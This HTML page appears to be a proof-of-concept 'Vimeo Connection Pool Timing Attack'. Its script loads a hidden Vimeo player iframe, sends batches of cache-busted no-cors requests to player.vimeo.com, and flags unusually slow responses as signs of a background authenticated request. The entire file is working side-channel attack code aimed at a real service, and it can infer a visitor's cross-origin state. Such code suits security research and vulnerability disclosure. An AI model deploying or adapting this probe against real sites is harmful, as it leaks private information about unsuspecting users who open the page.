<!DOCTYPE html>
<html>
<head>
    <title>Vimeo Timing Attack</title>
</head>
<body>
    <h1>‚è±Ô∏è Vimeo Connection Pool Timing Attack</h1>
    <button onclick="startAttack()">Start Attack</button>
    <div id="results"></div>

    <script>
        const results = document.getElementById('results');
        
        function log(msg) {
            results.innerHTML += `<p>${msg}</p>`;
            console.log(msg);
        }
        
        async function startAttack() {
            log('üéØ Starting timing attack...');
            
            // Step 1: Load Vimeo iframe (this makes the auth request)
            const iframe = document.createElement('iframe');
            iframe.src = 'https://player.vimeo.com/video/935884964';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            // Step 2: Wait a moment, then start timing measurements
            setTimeout(() => {
                measureTimings();
            }, 1000);
        }
        
        async function measureTimings() {
            log('üìä Measuring connection timings...');
            
            // Request static resource from player.vimeo.com in blocks of 6
            const staticResource = 'https://player.vimeo.com/static/proxy.html';
            const blockSize = 6;
            const totalRequests = 20;
            
            const timings = [];
            
            for (let block = 0; block < Math.ceil(totalRequests / blockSize); block++) {
                const blockTimings = [];
                const promises = [];
                
                for (let i = 0; i < blockSize; i++) {
                    const requestNum = block * blockSize + i;
                    if (requestNum >= totalRequests) break;
                    
                    const start = performance.now();
                    
                    // Add cache buster
                    const url = `${staticResource}?_=${Date.now()}_${requestNum}`;
                    
                    const promise = fetch(url, { mode: 'no-cors' })
                        .then(() => {
                            const duration = performance.now() - start;
                            blockTimings.push(duration);
                            return duration;
                        })
                        .catch(e => {
                            blockTimings.push(null);
                            return null;
                        });
                    
                    promises.push(promise);
                }
                
                await Promise.all(promises);
                timings.push(...blockTimings);
                
                // Small delay between blocks
                await new Promise(r => setTimeout(r, 100));
            }
            
            analyzeTimings(timings);
        }
        
        function analyzeTimings(timings) {
            log('üìà Analysis:');
            
            timings.forEach((time, i) => {
                if (time === null) {
                    log(`Request ${i}: FAILED`);
                } else {
                    log(`Request ${i}: ${time.toFixed(2)}ms`);
                }
            });
            
            // Look for requests that took significantly longer
            const validTimings = timings.filter(t => t !== null);
            const avg = validTimings.reduce((a, b) => a + b, 0) / validTimings.length;
            const stdDev = Math.sqrt(
                validTimings.reduce((sum, t) => sum + Math.pow(t - avg, 2), 0) / validTimings.length
            );
            
            log(`Average: ${avg.toFixed(2)}ms`);
            log(`Std Dev: ${stdDev.toFixed(2)}ms`);
            
            // Find outliers (requests that took >133% of average)
            const outliers = timings
                .map((time, i) => ({ time, index: i }))
                .filter(({ time }) => time !== null && time > avg * 1.33);
            
            if (outliers.length > 0) {
                log(`üö® Found ${outliers.length} slow requests (potential sign of background XHR):`);
                outliers.forEach(({ time, index }) => {
                    log(`  Request ${index}: ${time.toFixed(2)}ms (${(time/avg*100).toFixed(0)}% of average)`);
                });
            }
        }
    </script>
</body>
</html>
